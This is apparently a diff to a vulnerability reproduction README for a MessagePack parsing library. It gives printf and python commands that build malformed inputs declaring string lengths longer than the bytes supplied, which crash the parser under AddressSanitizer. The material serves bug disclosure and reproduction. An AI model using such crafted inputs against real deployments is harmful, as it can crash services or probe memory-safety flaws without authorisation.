@@ -59,32 +59,42 @@ int main(int argc, char** argv) {
 }
 ```
 
-## 3. Create the crashing input (`crash.bin`, 74 bytes)
+## 3. Create the crashing input
 
-A MessagePack stream that declares payload lengths larger than the bytes that follow.
+You have two equivalent inputs; **the 17-byte minimal one is recommended** — it is
+deterministic, human-readable, and needs no Python or base64.
+
+### 3a. Minimal input (17 bytes) — one line, anyone can run
+
+A `fixstr` header (`0xB6`) that declares a **22-byte** string, followed by only **16** bytes.
+The stream promises more than it contains, which is the entire bug:
+
+```sh
+printf '\xb6\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff' > crash.bin
+```
+
+Verify:
+
+```sh
+wc -c < crash.bin        # expect: 17
+shasum -a 256 crash.bin  # expect: 8a53f4c9249cc5ac4b2f2a7d3c7beca8c7989b4f149bdee864d0402763d34bed
+```
+
+The 16 filler bytes are arbitrary — only the *count* matters (fewer than the declared 22).
+`make_payload.py` in `CWPack-poc/` regenerates this and prints the one-liner.
+
+### 3b. Original fuzzer input (74 bytes) — optional
+
+The exact bytes AddressSanitizer first crashed on (declares several oversized lengths):
 
 ```sh
 python3 -c "import base64; open('crash.bin','wb').write(base64.b64decode('BQUF/////////////////////////////////////////////////////////////////////7b//////////////////////wU='))"
+shasum -a 256 crash.bin  # expect: dce348de62f29552da54cc15652e2aa032a27e119ac9dfd73c7aa83909703aec
+wc -c < crash.bin        # expect: 74
 ```
 
-Verify you got the right bytes:
-
-```sh
-shasum -a 256 crash.bin
-# expect: dce348de62f29552da54cc15652e2aa032a27e119ac9dfd73c7aa83909703aec
-wc -c < crash.bin
-# expect: 74
-```
-
-_No Python?_ Equivalent input (three `0x05`, then `0xff` fill, a `0xb6`, more `0xff`, trailing `0x05`):
-
-```sh
-printf '\x05\x05\x05' > crash.bin
-for i in $(seq 1 69); do printf '\xff' >> crash.bin; done
-# adjust to exactly match the sha256 above if needed; the base64 method is authoritative.
-```
-
-(The base64 method is authoritative — use it if the two disagree.)
+Both inputs crash at the same line (`basic_contexts.c:159`); 3a reports `size=-6`, 3b `size=-4`
+(the overshoot differs, the bug is identical).
 
 ## 4. Build with AddressSanitizer
 
